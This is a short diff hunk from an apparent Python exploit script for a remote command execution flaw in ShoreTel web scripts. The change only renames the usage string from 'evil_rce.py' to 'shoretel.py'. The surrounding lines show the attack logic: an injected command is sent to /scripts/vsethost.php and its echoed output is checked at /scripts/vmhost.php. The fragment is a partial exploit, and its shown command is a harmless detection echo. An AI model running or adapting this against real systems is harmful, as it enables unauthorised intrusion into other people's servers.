@@ -20,7 +20,7 @@ def build_shoretel(cmd):
 	return obj
 
 def exploit():
-	if len(sys.argv) < 2: sys.exit("Usage: python evil_rce.py http://target.com")
+	if len(sys.argv) < 2: sys.exit("Usage: python shoretel.py http://target.com")
 	url = sys.argv[1]
 	c = requests.get(url+"/scripts/vsethost.php",params = build_shoretel("echo bWVua3JlcDEzMzcK"))
 	if requests.get(url+"/scripts/vmhost.php").text.strip() == "bWVua3JlcDEzMzcK":
